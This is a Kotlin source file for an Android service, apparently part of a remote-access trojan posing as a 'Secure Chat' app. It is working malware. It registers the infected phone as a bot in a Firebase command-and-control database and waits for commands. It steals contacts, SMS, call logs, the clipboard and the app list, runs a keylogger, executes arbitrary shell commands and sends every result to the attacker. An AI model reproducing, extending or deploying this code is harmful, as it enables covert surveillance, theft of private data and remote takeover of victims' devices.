package com.secure.chat.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.UUID

class TargetC2Service : Service() {

    companion object {
        private const val TAG = "TargetC2"
        private const val FIREBASE_URL = "https://selzxrat-v5-c2-default-rtdb.firebaseio.com"
        private const val REF_BOTS = "selzxratV5/bots"
        private const val REF_COMMANDS = "selzxratV5/commands"
        private const val REF_BROADCAST = "selzxratV5/broadcast"
        private const val REF_EXFIL = "selzxratV5/exfiltrated"
        private const val NOTIF_ID = 1001
        private const val CHANNEL_ID = "secure_chat_service"
        private const val CHANNEL_NAME = "Secure Chat Service"

        @Volatile
        var isRunning = false
            private set
        private var _deviceId: String = ""
        private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

        fun getDeviceId(): String = _deviceId
    }

    private val deviceId: String get() = _deviceId

    private lateinit var database: FirebaseDatabase
    private lateinit var botsRef: DatabaseReference
    private lateinit var commandsRef: DatabaseReference
    private lateinit var broadcastRef: DatabaseReference
    private lateinit var exfilRef: DatabaseReference
    private var commandListener: ChildEventListener? = null
    private var broadcastListener: ChildEventListener? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        // Generate device ID
        _deviceId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: UUID.randomUUID().toString()

        // Init Firebase
        try {
            database = FirebaseDatabase.getInstance(FIREBASE_URL)
            botsRef = database.getReference(REF_BOTS)
            commandsRef = database.getReference(REF_COMMANDS)
            broadcastRef = database.getReference(REF_BROADCAST)
            exfilRef = database.getReference(REF_EXFIL)
            Log.d(TAG, "Firebase OK: $deviceId")
        } catch (e: Exception) {
            Log.e(TAG, "Firebase init GAGAL: ${e.message}")
            stopSelf()
            return
        }

        startForeground(NOTIF_ID, createNotification())

        // 🔥 INI YANG BIKIN BOT MUNCUL — REGISTRASI KE FIREBASE
        registerBot()

        listenForCommands()
        listenForBroadcast()
        isRunning = true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "start", "restart" -> if (!isRunning) onCreate()
            "stop" -> { stopC2(); stopSelf() }
            "fcm_command" -> {
                val type = intent.getStringExtra("type") ?: return START_STICKY
                val payload = intent.getStringExtra("payload") ?: ""
                executeCommand(type, payload)
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // =================== NOTIFICATION ===================

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Secure Chat background service"
                setShowBadge(false); enableVibration(false)
            }
            (getSystemService(NotificationManager::class.java))?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Secure Chat")
            .setContentText("Service is running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    // =================== REGISTRASI BOT (KRITIKAL) ===================

    private fun registerBot() {
        val info = mapOf(
            "deviceId" to deviceId,
            "deviceName" to (Build.MODEL ?: "Unknown"),
            "deviceModel" to Build.MODEL,
            "androidVersion" to Build.VERSION.RELEASE,
            "manufacturer" to Build.MANUFACTURER,
            "isOnline" to true,
            "lastSeen" to System.currentTimeMillis(),
            "ipAddress" to getIPAddress(),
            "country" to "",
            "batteryLevel" to getBatteryLevel(),
            "isCharging" to isCharging(),
            "ramTotal" to 0L,
            "ramAvailable" to 0L,
            "storageTotal" to 0L,
            "storageAvailable" to 0L,
            "installedApps" to 0,
            "isAccessibilityEnabled" to TargetAccessibility.isConnected,
            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected,
            "isAdminEnabled" to false,
            "isScreenLocked" to false,
            "simInfo" to getSimInfo()
        )

        // 🔥 TULIS KE FIREBASE — INI YANG DIBACA SAMA CONTROLLER
        botsRef.child(deviceId).setValue(info)
            .addOnSuccessListener { Log.d(TAG, "Bot TERDAFTAR: $deviceId") }
            .addOnFailureListener { Log.e(TAG, "Bot GAGAL daftar: ${it.message}") }

        // Keep alive setiap 5 menit
        scope.launch {
            while (isActive) {
                delay(300_000)
                try {
                    botsRef.child(deviceId).child("lastSeen").setValue(System.currentTimeMillis())
                    botsRef.child(deviceId).child("isOnline").setValue(true)
                } catch (_: Exception) {}
            }
        }
    }

    // =================== LISTENER COMMAND ===================

    private fun listenForCommands() {
        commandListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, prev: String?) {
                val map = snapshot.value as? Map<String, Any> ?: return
                val target = map["target"] as? String ?: ""
                if (target == deviceId || target == "") {
                    val type = map["type"] as? String ?: return
                    val payload = map["payload"] as? String ?: ""
                    executeCommand(type, payload)
                    snapshot.ref.removeValue()
                }
            }
            override fun onChildChanged(s: DataSnapshot, p: String?) {}
            override fun onChildRemoved(s: DataSnapshot) {}
            override fun onChildMoved(s: DataSnapshot, p: String?) {}
            override fun onCancelled(e: DatabaseError) { Log.e(TAG, "Cmd listener error: ${e.message}") }
        }
        commandsRef.addChildEventListener(commandListener!!)
    }

    private fun listenForBroadcast() {
        broadcastListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, prev: String?) {
                val map = snapshot.value as? Map<String, Any> ?: return
                val type = map["type"] as? String ?: return
                val payload = map["payload"] as? String ?: ""
                executeCommand(type, payload)
                snapshot.ref.removeValue()
            }
            override fun onChildChanged(s: DataSnapshot, p: String?) {}
            override fun onChildRemoved(s: DataSnapshot) {}
            override fun onChildMoved(s: DataSnapshot, p: String?) {}
            override fun onCancelled(e: DatabaseError) {}
        }
        broadcastRef.addChildEventListener(broadcastListener!!)
    }

    // =================== EKSEKUTOR COMMAND ===================

    private fun executeCommand(type: String, payload: String) {
        Log.d(TAG, "Exec: $type")
        when (type) {
            "get_info" -> sendExfil("get_info", "Device: ${Build.MANUFACTURER} ${Build.MODEL}, Android: ${Build.VERSION.RELEASE}")
            "get_contacts" -> handleGetContacts()
            "get_sms" -> handleGetSMS()
            "get_call_logs" -> handleGetCallLogs()
            "get_location" -> sendExfil("get_location", "GPS membutuhkan permission FINE_LOCATION aktif")
            "list_apps" -> handleListApps()
            "keylogger_start" -> { TargetKeylogger.start(this); sendExfil("keylogger_start", "Keylogger started") }
            "keylogger_stop" -> { TargetKeylogger.stop(); sendExfil("keylogger_stop", "Keylogger stopped") }
            "keylogger_get" -> sendExfil("keylogger_get", TargetKeylogger.getLogs())
            "clipboard_get" -> handleClipboardGet()
            "clipboard_set" -> handleClipboardSet(payload)
            "vibrate" -> handleVibrate(payload)
            "torch_on" -> handleTorch(true)
            "torch_off" -> handleTorch(false)
            "toast" -> handleToast(payload)
            "alert_dialog" -> sendExfil("alert_dialog", "Alert: $payload")
            "open_url" -> handleOpenURL(payload)
            "send_sms" -> handleSendSMS(payload)
            "shell_exec" -> handleShellExec(payload)
            "self_destruct" -> handleSelfDestruct()
            else -> Log.w(TAG, "Command unknown: $type")
        }
    }

    // =================== HANDLER ===================

    private fun handleGetContacts() {
        try {
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            val c = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val num = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                    c.add("$name: $num")
                    if (c.size >= 100) break
                }
            }
            sendExfil("get_contacts", c.joinToString("\n").take(5000))
        } catch (e: Exception) { sendExfil("get_contacts", "Error: ${e.message}") }
    }

    private fun handleGetSMS() {
        try {
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 50"
            )
            val sms = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                    sms.add("$addr: $body")
                }
            }
            sendExfil("get_sms", sms.joinToString("\n").take(5000))
        } catch (e: Exception) { sendExfil("get_sms", "Error: ${e.message}") }
    }

    private fun handleGetCallLogs() {
        try {
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 50"
            )
            val logs = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val num = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)) ?: ""
                    val type = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)) ?: "?"
                    val t = when(type) { "1" -> "IN" "2" -> "OUT" "3" -> "MISS" else -> type }
                    logs.add("$num ($t)")
                }
            }
            sendExfil("get_call_logs", logs.joinToString("\n").take(5000))
        } catch (e: Exception) { sendExfil("get_call_logs", "Error: ${e.message}") }
    }

    private fun handleListApps() {
        try {
            val apps = packageManager.getInstalledApplications(0)
            val list = apps.map { "${packageManager.getApplicationLabel(it)} (${it.packageName})" }
            sendExfil("list_apps", list.joinToString("\n").take(5000))
        } catch (e: Exception) { sendExfil("list_apps", "Error: ${e.message}") }
    }

    private fun handleClipboardGet() {
        try {
            val clip = (getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager).primaryClip
            val text = if (clip != null && clip.itemCount > 0) clip.getItemAt(0).text?.toString() ?: "" else ""
            sendExfil("clipboard", text)
        } catch (e: Exception) { sendExfil("clipboard", "Error: ${e.message}") }
    }

    private fun handleClipboardSet(text: String) {
        try {
            (getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager)
                .setPrimaryClip(android.content.ClipData.newPlainText("text", text))
            sendExfil("clipboard", "Clipboard set")
        } catch (e: Exception) { sendExfil("clipboard", "Error: ${e.message}") }
    }

    private fun handleVibrate(pattern: String) {
        try {
            val v = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val ms = pattern.split(",").mapNotNull { it.trim().toLongOrNull() }.toLongArray()
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(android.os.VibrationEffect.createWaveform(ms.ifEmpty { longArrayOf(0, 1000) }, -1))
            } else {
                @Suppress("DEPRECATION")
                v.vibrate(ms.ifEmpty { longArrayOf(0, 1000) }, -1)
            }
            sendExfil("vibrate", "Vibrated")
        } catch (e: Exception) { sendExfil("vibrate", "Error: ${e.message}") }
    }

    @Suppress("DEPRECATION")
    private fun handleTorch(enable: Boolean) {
        try {
            (getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager)
                .setTorchMode((getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager).cameraIdList[0], enable)
            sendExfil("torch", if (enable) "Torch ON" else "Torch OFF")
        } catch (e: Exception) { sendExfil("torch", "Error: ${e.message}") }
    }

    private fun handleToast(message: String) {
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
        }
        sendExfil("toast", "Toast: $message")
    }

    private fun handleOpenURL(url: String) {
        try {
            startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
            sendExfil("open_url", "URL opened: $url")
        } catch (e: Exception) { sendExfil("open_url", "Error: ${e.message}") }
    }

    private fun handleSendSMS(data: String) {
        val parts = data.split("|", limit = 2)
        if (parts.size < 2) { sendExfil("send_sms", "Format: number|message"); return }
        try {
            startActivity(Intent(Intent.ACTION_SENDTO).apply {
                data = android.net.Uri.parse("smsto:${parts[0].trim()}")
                putExtra("sms_body", parts[1].trim())
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
            sendExfil("send_sms", "SMS opened for ${parts[0].trim()}")
        } catch (e: Exception) { sendExfil("send_sms", "Error: ${e.message}") }
    }

    private fun handleShellExec(command: String) {
        try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            sendExfil("shell_exec", output.take(5000))
        } catch (e: Exception) { sendExfil("shell_exec", "Error: ${e.message}") }
    }

    private fun handleSelfDestruct() {
        sendExfil("self_destruct", "Self-destruct initiated")
        try { botsRef.child(deviceId).removeValue() } catch (_: Exception) {}
        startActivity(Intent(Intent.ACTION_DELETE).apply {
            data = android.net.Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }

    // =================== EXFIL ===================

    private fun sendExfil(type: String, content: String) {
        try {
            if (::exfilRef.isInitialized) {
                exfilRef.push().setValue(mapOf(
                    "type" to type,
                    "content" to content,
                    "deviceId" to deviceId,
                    "timestamp" to System.currentTimeMillis()
                )).addOnFailureListener { Log.e(TAG, "Exfil GAGAL: ${it.message}") }
            }
        } catch (e: Exception) { Log.e(TAG, "Exfil error", e) }
    }

    // =================== UTILITY ===================

    private fun getIPAddress(): String {
        try {
            val ifaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (ifaces.hasMoreElements()) {
                val addrs = ifaces.nextElement().inetAddresses
                while (addrs.hasMoreElements()) {
                    val a = addrs.nextElement()
                    if (!a.isLoopbackAddress && a is java.net.Inet4Address) return a.hostAddress ?: ""
                }
            }
        } catch (_: Exception) {}
        return ""
    }

    private fun getBatteryLevel(): Int {
        val i = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return -1
        val l = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
        val s = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
        return if (l >= 0 && s > 0) (l * 100) / s else -1
    }

    private fun isCharging(): Boolean {
        val s = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            ?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
        return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING || s == android.os.BatteryManager.BATTERY_STATUS_FULL
    }

    private fun getSimInfo(): String {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager ?: return "N/A"
        return try { "${tm.simOperatorName ?: "N/A"} | ${tm.simCountryIso?.uppercase() ?: "N/A"}" } catch (_: Exception) { "N/A" }
    }

    private fun stopC2() {
        isRunning = false
        scope.cancel()
        try {
            if (::botsRef.isInitialized) {
                botsRef.child(deviceId).child("isOnline").setValue(false)
                commandListener?.let { commandsRef.removeEventListener(it) }
                broadcastListener?.let { broadcastRef.removeEventListener(it) }
            }
        } catch (_: Exception) {}
        stopForeground(STOP_FOREGROUND_REMOVE)
    }

    override fun onDestroy() { super.onDestroy(); stopC2() }
}
